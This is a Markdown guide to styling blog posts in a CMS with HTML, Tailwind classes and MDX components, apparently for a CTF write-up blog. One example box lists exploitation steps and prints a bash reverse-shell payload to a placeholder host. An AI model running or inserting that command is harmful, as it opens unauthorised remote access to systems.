# Rich Content Formatting Guide for Your CMS

Your Tailblaze CMS now supports rich formatting! Here's how to add colors, highlights, and custom styling to your blog posts:

## 🎨 **Colored Text**

### Method 1: Using HTML in Markdown

```html
<span style="color: red;">This text is red</span>
<span style="color: #3B82F6;">This text is blue</span>
<span style="color: green; font-weight: bold;">Bold green text</span>
```

### Method 2: Using Tailwind Classes

```html
<span class="text-red-600 font-bold">Bold red text</span>
<span class="text-blue-500 underline">Blue underlined text</span>
<span class="text-purple-600 text-xl">Large purple text</span>
```

### Method 3: Using Custom Components (MDX)

```jsx
<ColoredText color="red">This text is red</ColoredText>
<ColoredText color="blue">This text is blue</ColoredText>
```

## ✨ **Highlights and Emphasis**

```html
<mark>This text is highlighted</mark>
<span class="bg-yellow-200 px-1 rounded">Custom highlight</span>
```

Using component:

```jsx
<Highlight>This is highlighted text</Highlight>
```

## 🏷️ **Badges and Labels**

```html
<span class="bg-blue-100 text-blue-800 px-2 py-1 rounded text-sm font-medium">Badge</span>
```

Using component:

```jsx
<Badge>Important</Badge>
```

## 📦 **Alert Boxes**

```jsx
<Alert type="info">This is an info alert</Alert>
<Alert type="warning">This is a warning</Alert>
<Alert type="error">This is an error alert</Alert>
<Alert type="success">This is a success alert</Alert>
```

## 📝 **Custom Boxes**

```jsx
<Box>This content is in a styled box with border and background</Box>
```

## 💻 **Inline Code with Colors**

```html
<code class="bg-gray-100 text-green-600 px-1 py-0.5 rounded">colorful code</code>
```

Using component:

```jsx
<InlineCode>styled code</InlineCode>
```

## 🎯 **Common Color Classes**

- **Text Colors**: `text-red-600`, `text-blue-600`, `text-green-600`, `text-purple-600`, `text-pink-600`
- **Background Colors**: `bg-red-100`, `bg-blue-100`, `bg-green-100`, `bg-yellow-100`
- **Font Weights**: `font-light`, `font-normal`, `font-medium`, `font-semibold`, `font-bold`
- **Text Sizes**: `text-xs`, `text-sm`, `text-base`, `text-lg`, `text-xl`, `text-2xl`

## 🚀 **Advanced Styling Examples**

### Cybersecurity Content Example:

```html
<Alert type="warning">
  <strong>⚠️ Security Alert:</strong> This vulnerability has a
  <span class="text-red-600 font-bold">CRITICAL</span> severity rating.
</Alert>

<Box>
  <h4 class="text-blue-600 font-semibold">Exploitation Steps:</h4>
  <ol>
    <li>Identify the <InlineCode>command injection</InlineCode> point</li>
    <li>
      Craft payload:
      <code class="bg-red-100 text-red-800 px-1 rounded"
        >bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'</code
      >
    </li>
    <li>Execute and gain <Highlight>reverse shell</Highlight></li>
  </ol>
</Box>
```

### Machine Info Box:

```html
<div class="bg-gray-50 border-l-4 border-blue-500 p-4 mb-4">
  <h4 class="text-blue-600 font-semibold mb-2">🖥️ Lab Information</h4>
  <ul class="space-y-1">
    <li><strong>Machine Name:</strong> <span class="text-green-600 font-mono">Vanity</span></li>
    <li><strong>Platform:</strong> <span class="text-blue-600">Proving Grounds Practice</span></li>
    <li><strong>Difficulty:</strong> <Badge>Intermediate</Badge></li>
  </ul>
</div>
```

## 📋 **Quick Reference**

Copy these examples directly into your CMS body field:

1. **Red text**: `<span style="color: red;">red text</span>`
2. **Blue bold**: `<span class="text-blue-600 font-bold">blue bold</span>`
3. **Highlight**: `<mark>highlighted</mark>`
4. **Info box**: `<Alert type="info">Your message</Alert>`
5. **Code**: `<InlineCode>code</InlineCode>`

Your CMS will render all of these with beautiful Tailblaze styling! 🎉
